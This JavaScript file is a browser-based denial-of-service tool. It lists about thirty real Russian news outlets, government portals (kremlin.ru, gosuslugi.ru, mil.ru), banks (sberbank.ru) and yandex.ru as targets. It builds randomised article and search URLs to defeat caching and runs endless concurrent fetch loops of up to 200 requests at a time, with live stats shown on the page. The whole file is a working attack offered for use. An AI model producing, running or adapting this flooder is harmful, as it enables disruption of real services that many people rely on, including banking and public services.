let targets = {
    'https://lenta.ru': {
        // https://lenta.ru/news/2022/02/28/obletim/
        pattern: 'https://lenta.ru/news/%YYYY/%MM/%DD/%STR/',
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://ria.ru/': {
        // https://ria.ru/20220223/shoygu-1275575159.html
        pattern: 'https://ria.ru/%YYYY%MM%DD/%STR-%NUM.html',
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://ria.ru/lenta/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://www.rbc.ru/': {
        // https://www.rbc.ru/politics/26/02/2022/6219ec289a79470d35420698
        pattern: 'https://www.rbc.ru/politics/%DD/%MM/%YYYY/%STR',
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://www.interfax.ru/': {
        pattern: 'https://www.interfax.ru/search/?sw=%STR',
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://www.rt.com/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'http://kremlin.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'http://en.kremlin.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://smotrim.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://tass.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://tvzvezda.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://vsoloviev.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://www.1tv.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://www.vesti.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://online.sberbank.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://sberbank.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://gosuslugi.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://mil.ru': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://iz.ru': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://yandex.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://sputniknews.com/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://inosmi.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://gazeta.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://kommersant.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://rubaltic.ru/': {
        pattern: 'https://www.rubaltic.ru/search/?q=%STR',
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://ura.news/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://radiokp.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://echo.msk.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
    'https://life.ru/': {
        number_of_requests: 0,
        number_of_errored_responses: 0,
    },
}

let statsEl = document.getElementById('stats')

function printStats() {
    statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
}
setInterval(printStats, 500)

let CONCURRENCY_LIMIT = 200
let queue = []

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController()
    const id = setTimeout(() => controller.abort(), options.timeout)
    return fetch(resource, {
        signal: controller.signal,
        mode: 'no-cors',
        referrerPolicy: 'no-referrer',
    })
        .then((response) => {
            clearTimeout(id)
            return response
        })
        .catch((error) => {
            clearTimeout(id)
            throw error
        })
}

function createTargetUrl(target) {
    let target_url = targets[target].pattern
    if (target_url === undefined) {
        return target
    }

    const STR = getRandomString(3 + getRandomInteger(7))
    const NUM = getRandomInteger(1e9)
    const date = new Date()
    const YYYY = date.getFullYear()
    const MM = date.getMonth() + 1
    const DD = date.getDate()

    target_url = target_url.replace('%STR', STR)
    target_url = target_url.replace('%NUM', NUM.toString())
    target_url = target_url.replace('%YYYY', YYYY.toString())
    target_url = target_url.replace('%MM', MM.toString().padStart(2, '0'))
    target_url = target_url.replace('%DD', DD.toString().padStart(2, '0'))
    return target_url
}

function getRandomString(length) {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789-'
    let result = ''
    for (let i = 0; i < length; i++) {
        result += alphabet.charAt(getRandomInteger(alphabet.length))
    }
    return result
}

function getRandomInteger(max) {
    return 1 + Math.floor(Math.random() * (max - 1))
}

async function flood(target) {
    for (let i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }

        const target_url = createTargetUrl(target)
        queue.push(
            fetchWithTimeout(target_url, { timeout: 1000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return
                    }
                    targets[target].number_of_errored_responses++
                    targets[target].error_message = error.message
                })
                .then((response) => {
                    if (response && !response.ok) {
                        targets[target].number_of_errored_responses++
                        targets[target].error_message = response.statusText
                    }
                    targets[target].number_of_requests++
                })
        )
    }
}

//Start
Object.keys(targets).map(flood)
